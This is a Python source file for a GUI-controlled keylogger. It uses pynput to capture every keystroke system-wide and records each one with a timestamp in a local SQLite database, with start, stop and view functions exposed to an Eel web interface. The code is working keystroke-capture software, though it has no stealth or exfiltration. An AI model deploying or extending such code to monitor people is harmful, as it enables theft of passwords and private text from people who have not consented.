
import eel
from pynput import keyboard
import sqlite3
from datetime import datetime

# ==================== Configuration & Globals ====================

# Global variable to control keylogging state
is_logging = False

# Database file name
DB_NAME = 'keystrokes.db'

# ==================== Database Functions ====================

def connect_db():
    """Establish a connection to the SQLite database."""
    return sqlite3.connect(DB_NAME)

def setup_database():
    """Create keystrokes table if it doesn't exist."""
    conn = connect_db()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_pressed TEXT,
            timestamp DATETIME
        )
    ''')
    conn.commit()
    conn.close()

def insert_keystroke(key_text):
    """Insert a keystroke with a timestamp into the database."""
    conn = connect_db()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO keystrokes (key_pressed, timestamp)
        VALUES (?, ?)
    ''', (key_text, datetime.now()))
    conn.commit()
    conn.close()

# ==================== Keylogger Callback ====================

def on_press(key):
    """Callback for when a key is pressed."""
    global is_logging
    if is_logging:
        try:
            keystroke = key.char
        except AttributeError:
            keystroke = str(key)
        insert_keystroke(keystroke)

# ==================== Eel Frontend Bindings ====================

@eel.expose
def start_logging():
    """Start keylogging."""
    global is_logging
    is_logging = True
    print("[INFO] Keylogging started.")

@eel.expose
def stop_logging():
    """Stop keylogging."""
    global is_logging
    is_logging = False
    print("[INFO] Keylogging stopped.")

@eel.expose
def get_keystrokes():
    """Retrieve all logged keystrokes."""
    conn = connect_db()
    cursor = conn.cursor()
    cursor.execute('SELECT key_pressed, timestamp FROM keystrokes')
    results = cursor.fetchall()
    conn.close()
    return results

# ==================== Application Startup ====================

def launch_gui():
    """Start Eel and the keyboard listener."""
    eel.init('web')
    eel.start('index.html', block=False)

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while True:
        eel.sleep(1)  # Keep Eel alive

# ==================== Main Execution ====================

if __name__ == '__main__':
    setup_database()
    launch_gui()
